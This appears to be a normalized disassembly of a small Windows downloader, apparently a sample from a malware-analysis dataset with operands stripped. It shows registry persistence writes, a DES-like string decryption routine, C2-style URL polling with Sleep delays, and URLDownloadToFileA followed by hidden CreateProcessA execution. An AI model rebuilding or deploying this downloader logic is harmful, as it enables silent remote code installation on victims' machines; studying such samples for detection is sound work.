sub_401000
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
retn
mov ebp [ esp + 0x18 ]
test ebp ebp
je r-xdata
mov edx [ esp + 0x1c ]
test edx edx
je r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebx ecx
add ebx 0x7
and ebx 0xfffffff8
je r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push edx
call sub_4010f0
mov al [ rw-data ]
add esp 0x8
test al al
jne r-xdata
sar ebx 0x3
mov edi ebx
test edi edi
jle r-xdata
sar ebx 0x3
mov edi ebx
test edi edi
jle r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn
mov ebx [ esp + 0x20 ]
test bl bl
sete [ esp + 0x20 ]
mov ebx [ esp + 0x20 ]
push ebx
push rw-data
push ebp
push esi
call sub_401170
mov eax [ esp + 0x30 ]
push eax
push rw-data
push esi
push esi
call sub_401170
push ebx
push rw-data
push esi
push esi
call sub_401170
add esp 0x30
add esi 0x8
add ebp 0x8
dec edi
jne r-xdata
push ebx
push rw-data
push ebp
push esi
call sub_401170
add esp 0x10
add esi 0x8
add ebp 0x8
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn
sub_4010f0
xor eax eax
push ebx
mov ebx [ esp + 0xc ]
mov [ rw-data ] eax
mov [ rw-data ] eax
push esi
mov [ rw-data ] eax
cmp ebx 0x10
push edi
mov [ rw-data ] eax
mov ecx 0x10
jg r-xdata
mov esi [ esp + 0x10 ]
mov edx ecx
mov edi rw-data
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
[ edi ] [ esi ]
call sub_401290
add esp 0x8
cmp ebx 0x8
pop edi
pop esi
pop ebx
jle r-xdata
mov ecx ebx
mov [ rw-data ] 0x0
retn
push rw-data
push rw-data
call sub_401290
add esp 0x8
mov [ rw-data ] 0x1
retn
sub_401170
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
push 0x40
push eax
push rw-data
call sub_4014b0
push 0x40
push r--data
push rw-data
push rw-data
call sub_4013d0
mov al [ esp + 0x3c ]
add esp 0x1c
test al al
jne r-xdata
mov eax [ esp + 0x1c ]
mov ebp 0x10
lea ebx [ eax + 0x2d0 ]
mov ebx [ esp + 0x1c ]
mov ebp 0x10
mov eax [ rw-data ]
mov ecx 0x8
mov esi eax
mov edi rw-data
push ebx
push eax
[ edi ] [ esi ]
call sub_401310
mov ecx [ rw-data ]
mov edx [ rw-data ]
push 0x20
push ecx
push edx
call sub_401420
mov edi [ rw-data ]
add esp 0x14
mov ecx 0x8
mov esi rw-data
sub ebx 0x30
dec ebp
[ edi ] [ esi ]
jne r-xdata
push 0x40
push r--data
push rw-data
push rw-data
call sub_4013d0
mov eax [ esp + 0x24 ]
push 0x40
push rw-data
push eax
call sub_4014f0
add esp 0x1c
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ rw-data ]
mov ecx 0x8
mov esi eax
mov edi rw-data
push ebx
push eax
[ edi ] [ esi ]
call sub_401310
mov ecx [ rw-data ]
mov edx [ rw-data ]
push 0x20
push ecx
push edx
call sub_401420
mov edi [ rw-data ]
add esp 0x14
mov ecx 0x8
mov esi rw-data
add ebx 0x30
dec ebp
[ edi ] [ esi ]
jne r-xdata
jmp r-xdata
sub_401290
mov eax [ esp + 0x8 ]
push esi
push edi
push 0x40
push eax
push rw-data
call sub_4014b0
push 0x38
push r--data
push rw-data
push rw-data
call sub_4013d0
mov edi [ esp + 0x28 ]
add esp 0x1c
xor esi esi
movsx ecx [ esi + r--data ]
mov edx [ rw-data ]
push ecx
push 0x1c
push edx
call sub_401450
movsx eax [ esi + r--data ]
mov ecx [ rw-data ]
push eax
push 0x1c
push ecx
call sub_401450
push 0x30
push r--data
push rw-data
push edi
call sub_4013d0
add esp 0x28
inc esi
add edi 0x30
cmp esi 0x10
jl r-xdata
pop edi
pop esi
retn
sub_401310
push esi
mov esi [ esp + 0x8 ]
push 0x30
push r--data
push esi
push rw-data
call sub_4013d0
mov eax [ esp + 0x1c ]
push 0x30
push eax
push rw-data
call sub_401420
push rw-data
push esi
call sub_401360
push 0x20
push r--data
push esi
push esi
call sub_4013d0
add esp 0x34
pop esi
retn
sub_401360
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor edi edi
mov ebp 0x8
mov al [ esi + 0x1 ]
mov cl [ esi + 0x2 ]
shl al 0x1
add al cl
mov cl [ esi + 0x3 ]
mov dl [ esi ]
push 0x4
shl al 0x1
add al cl
mov cl [ esi + 0x4 ]
shl al 0x1
add al cl
movsx ecx al
mov al [ esi + 0x5 ]
shl dl 0x1
add dl al
movsx eax dl
add eax edi
shl eax 0x4
lea ecx [ ecx + eax + r--data ]
push ecx
push ebx
call sub_4014b0
add esp 0xc
add edi 0x4
add esi 0x6
add ebx 0x4
dec ebp
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4013d0
mov ecx [ esp + 0x10 ]
xor eax eax
push esi
push edi
test ecx ecx
jle r-xdata
mov edi [ esp + 0xc ]
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
sub esi rw-data
movsx edx [ esi + eax + rw-data ]
inc eax
mov dl [ edx + edi - 0x1 ]
cmp eax ecx
mov [ eax + rw-data ] dl
jl r-xdata
sub_401420
push esi
mov esi [ esp + 0x10 ]
test esi esi
jle r-xdata
pop esi
retn
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
push ebx
sub ecx eax
mov dl [ ecx + eax ]
mov bl [ eax ]
xor bl dl
mov [ eax ] bl
inc eax
dec esi
jne r-xdata
pop ebx
sub_401450
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push ebx
mov ecx eax
push ebp
push esi
mov ebx ecx
push edi
mov esi edx
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov ebx [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
lea esi [ edx + eax ]
sub ecx eax
mov edi edx
mov ebp ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
mov ecx eax
sub edi eax
mov esi rw-data
add edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4014b0
push esi
mov esi [ esp + 0x10 ]
xor eax eax
test esi esi
jle r-xdata
pop esi
retn
push ebp
mov ebp [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov edx eax
mov cl al
sar edx 0x3
and cl 0x7
mov dl [ edx + edi ]
sar dl cl
and dl 0x1
mov [ eax + ebp ] dl
inc eax
cmp eax esi
jl r-xdata
pop edi
pop ebp
sub_4014f0
mov edx [ esp + 0x4 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov ecx ebp
push edi
sar ecx 0x3
mov esi ecx
xor eax eax
mov edi edx
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
xor eax eax
test ebp ebp
jle r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ esp + 0x14 ]
push ebx
mov ecx eax
mov bl [ eax + edi ]
sar ecx 0x3
lea esi [ ecx + edx ]
mov ecx eax
and ecx 0x7
shl bl cl
mov cl [ esi ]
or cl bl
inc eax
cmp eax ebp
mov [ esi ] cl
jl r-xdata
pop ebx
sub_401540
sub esp 0x60c
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x108 ]
push esi
push edi
mov edi [ esp + 0x618 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x620 ]
and ecx 0x3
test eax eax
mov eax [ esp + 0x624 ]
[ edi ] [ esi ]
jne r-xdata
mov ecx [ esp + 0x61c ]
lea edx [ esp + 0x110 ]
test eax eax
push ecx
push edx
je r-xdata
mov ecx [ esp + 0x61c ]
lea edx [ esp + 0x110 ]
test eax eax
push ecx
push edx
je r-xdata
push rw-data
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
mov eax [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push esi
push ecx
push 0x1
lea edx [ esp + 0x11c ]
push 0x0
push edx
push eax
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x60c
retn
lea eax [ esp + 0x18 ]
push eax
call sprintf
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x214 ]
mov esi ecx
mov ecx 0x100
[ edi ]
push 0x1
push rw-data
lea ecx [ esp + 0x21c ]
push rw-data
push ecx
inc esi
call sub_401000
add esp 0x10
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x214 ]
push edx
push 0xf003f
push 0x0
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ RegCloseKey@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x60c
retn
pop edi
xor eax eax
pop esi
add esp 0x60c
retn
sub_401690
sub esp 0x404
or ecx 0xffffffff
xor eax eax
push ebx
mov ebx [ esp + 0x40c ]
push esi
push edi
mov edi ebx
push 0x1
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x14 ]
mov esi ecx
mov ecx 0x100
[ edi ]
push rw-data
lea eax [ esp + 0x18 ]
push rw-data
push eax
inc esi
call sub_401000
add esp 0x10
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push 0xf003f
push 0x0
push edx
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push esi
push ebx
push 0x1
push 0x0
push rw-data
push eax
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x404
retn
mov ecx [ esp + 0xc ]
push ecx
call [ RegCloseKey@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x404
retn
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x404
retn
sub_401740
mov edx [ esp + 0x4 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov edx [ esp + 0xc ]
pop edi
mov [ ecx + edx ] 0x0
retn
mov edi [ esp + 0xc ]
push ebx
mov ebx edx
push ebp
push esi
sub ebx edi
mov [ esp + 0x14 ] ecx
inc esi
cmp esi 0x56
jl r-xdata
mov eax esi
mov ebp 0x56
sub eax ecx
add eax 0x56
cdq
idiv ebp
mov dl [ edx + rw-data ]
mov [ edi ] dl
mov al [ esi + rw-data ]
mov dl [ ebx + edi ]
cmp al dl
jne r-xdata
mov eax [ esp + 0x14 ]
inc edi
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
xor esi esi
mov eax [ esp + 0x18 ]
pop esi
pop ebp
pop ebx
mov [ ecx + eax ] 0x0
pop edi
retn
sub_4017c0
mov eax 0x3a78
call sub_401e10
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov dx [ rw-data ]
push ebx
push esi
push edi
mov [ esp + 0x274 ] eax
mov [ esp + 0x278 ] ecx
mov ecx 0x3e
xor eax eax
lea edi [ esp + 0x27e ]
mov [ esp + 0x27c ] dx
[ edi ]
mov ecx [ rw-data ]
mov dx [ rw-data ]
stosw [ edi ]
mov eax [ rw-data ]
mov [ esp + 0x37c ] ecx
mov [ esp + 0x378 ] eax
mov ecx 0x3e
xor eax eax
lea edi [ esp + 0x382 ]
mov [ esp + 0x380 ] dx
mov dx [ rw-data ]
[ edi ]
mov ecx [ rw-data ]
mov [ esp + 0x484 ] dx
stosw [ edi ]
mov eax [ rw-data ]
mov [ esp + 0x480 ] ecx
mov [ esp + 0x47c ] eax
mov ecx 0x3e
xor eax eax
lea edi [ esp + 0x486 ]
[ edi ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
stosw [ edi ]
mov eax [ rw-data ]
mov [ esp + 0x70 ] ecx
mov cx [ rw-data ]
mov [ esp + 0x6c ] eax
mov eax [ rw-data ]
mov [ esp + 0x7c ] cx
mov [ esp + 0x78 ] eax
mov ecx 0x3c
xor eax eax
lea edi [ esp + 0x7e ]
mov [ esp + 0x74 ] edx
push 0x1
[ edi ]
stosw [ edi ]
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x1e88 ]
push rw-data
[ edi ]
mov ecx 0x100
lea edi [ esp + 0x168c ]
[ edi ]
mov ecx 0x100
lea edi [ esp + 0xe8c ]
[ edi ]
mov ecx 0x100
lea edi [ esp + 0x1a8c ]
[ edi ]
mov ecx 0x100
lea edi [ esp + 0x128c ]
lea edx [ esp + 0x1e8c ]
push rw-data
[ edi ]
push edx
call sub_401000
push 0x1
lea eax [ esp + 0x288 ]
push rw-data
lea ecx [ esp + 0x169c ]
push eax
push ecx
call sub_401000
push 0x1
lea edx [ esp + 0x39c ]
push rw-data
lea eax [ esp + 0xeac ]
push edx
push eax
call sub_401000
push 0x1
lea ecx [ esp + 0x4b0 ]
push rw-data
lea edx [ esp + 0x1abc ]
push ecx
push edx
call sub_401000
add esp 0x40
lea eax [ esp + 0x6c ]
lea ecx [ esp + 0x1284 ]
push 0x1
push rw-data
push eax
push ecx
call sub_401000
lea edi [ esp + 0x1e94 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x1684 ]
push eax
push eax
mov [ esp + ecx + 0x1e8c ] al
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0xe8c ]
push eax
push eax
mov [ esp + ecx + 0x1694 ] al
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x1a94 ]
push rw-data
mov [ esp + ecx + 0xe98 ] al
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x1298 ]
mov [ esp + ecx + 0x1a98 ] al
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x1298 ] al
call [ InternetOpenA@IAT ]
mov edi [ InternetOpenUrlA@IAT ]
push 0x0
push 0x4000100
push 0x0
lea edx [ esp + 0x1e90 ]
mov esi eax
push 0x0
push edx
push esi
mov [ esp + 0x28 ] esi
call edi
test eax eax
je r-xdata
push 0x1b7740
call [ Sleep@IAT ]
pop edi
pop esi
pop ebx
add esp 0x3a78
retn
mov eax [ esp + 0x3a88 ]
push 0x0
push 0x80000000
push 0x0
push 0x0
push eax
push esi
call edi
mov edx eax
test edx edx
mov [ esp + 0xc ] edx
je r-xdata
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x2a84 ]
[ edi ]
mov ecx 0x100
lea edi [ esp + 0x684 ]
[ edi ]
lea ecx [ esp + 0x24 ]
lea eax [ esp + 0x2a84 ]
push ecx
push 0x3e8
push eax
push edx
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x2a84 ]
lea edx [ esp + 0x684 ]
push ecx
push rw-data
push edx
call sprintf
lea edi [ esp + 0x690 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x690 ] al
lea eax [ esp + 0x1690 ]
lea ecx [ esp + 0x690 ]
push eax
push ecx
call strstr
add esp 0x14
test eax eax
je r-xdata
lea edx [ esp + 0x684 ]
lea ecx [ esp + 0x684 ]
sub eax edx
mov ebx eax
lea eax [ esp + 0xe84 ]
push eax
push ecx
call strstr
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x684 ]
push ebp
sub eax edx
lea esi [ ebx + 0x5 ]
mov ebp eax
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x2288 ]
cmp esi ebp
[ edi ]
jge r-xdata
mov ecx 0x100
xor eax eax
lea edi [ esp + 0xa88 ]
mov [ esp + ebp + 0x2288 ] 0x0
[ edi ]
lea eax [ esp + 0xa88 ]
lea ecx [ esp + 0x2288 ]
push eax
push ecx
call sub_401740
lea edx [ esp + 0x1a90 ]
lea eax [ esp + 0xa90 ]
push edx
push eax
call strstr
add esp 0x10
test eax eax
pop ebp
je r-xdata
lea ecx [ esp + 0x2288 ]
lea eax [ esp + ebx + 0x68d ]
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x2684 ]
[ edi ]
mov ecx 0x41
lea edi [ esp + 0x580 ]
[ edi ]
mov ecx 0x41
lea edi [ esp + 0x170 ]
[ edi ]
lea eax [ esp + 0x1284 ]
lea ecx [ esp + 0xa84 ]
push eax
push ecx
call strstr
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp + 0xa8a ]
push ecx
call atoi
lea eax [ eax + eax * 4 ]
add esp 0x4
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 8 ]
shl edx 0x6
push edx
call [ Sleep@IAT ]
pop edi
pop esi
pop ebx
add esp 0x3a78
retn
mov dl [ eax ]
inc eax
mov [ ecx ] dl
inc ecx
inc esi
cmp esi ebp
jl r-xdata
mov edx [ esp + 0x10 ]
mov esi [ InternetCloseHandle@IAT ]
push edx
call esi
mov eax [ esp + 0xc ]
push eax
call esi
lea edi [ esp + 0xa84 ]
or ecx 0xffffffff
xor eax eax
xor edx edx
[ edi ]
not ecx
add ecx 0xfffffffb
test ecx ecx
jle r-xdata
lea edi [ esp + 0xa84 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x2684 ]
[ edi ]
not ecx
dec ecx
sub edx 0x4
mov [ ecx + edx ] al
lea eax [ esp + 0x580 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea ecx [ esp + 0x170 ]
lea edx [ esp + 0x580 ]
push ecx
push 0x0
push rw-data
push edx
call [ GetTempFileNameA@IAT ]
lea edi [ esp + 0x170 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push eax
push eax
mov [ esp + ecx + 0x178 ] al
lea eax [ esp + 0x178 ]
lea ecx [ esp + 0x268c ]
push eax
push ecx
push 0x0
call URLDownloadToFileA
test eax eax
jne r-xdata
mov al [ esp + edx + 0xa88 ]
lea edi [ esp + 0xa84 ]
mov [ esp + edx + 0x2684 ] al
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
add ecx 0xfffffffb
cmp edx ecx
jl r-xdata
xor edx edx
mov ecx 0x11
lea edi [ esp + 0x28 ]
mov [ esp + 0x14 ] edx
[ edi ]
mov [ esp + 0x18 ] edx
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0x1c ] edx
push eax
push ecx
push edx
push edx
push 0x8000000
push edx
push edx
mov [ esp + 0x3c ] edx
push edx
lea edx [ esp + 0x190 ]
push edx
push 0x0
mov [ esp + 0x50 ] 0x44
call [ CreateProcessA@IAT ]
mov eax [ esp + 0x14 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ esp + 0x18 ]
push ecx
call esi
sub_401d70
sub esp 0x504
lea eax [ esp ]
push edi
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x0
push 0x0
lea ecx [ esp + 0xc ]
push 0x0
push ecx
call sub_401540
lea edx [ esp + 0x14 ]
push edx
call sub_401690
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x11c ]
add esp 0x14
[ edi ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x1
push eax
lea edx [ esp + 0x110 ]
push ecx
push edx
call sub_401000
lea eax [ esp + 0x118 ]
push eax
call sub_4017c0
jmp r-xdata
sub_401e10
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401fbf
cmp [ rw-data ] ebx
jne r-xdata
call sub_401faa
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401fbc
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401d70
sprintf
jmp [ sprintf@IAT ]
atoi
jmp [ atoi@IAT ]
strstr
jmp [ strstr@IAT ]
sub_401f91
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401faa
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401fbc
xor eax eax
retn
sub_401fbf
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
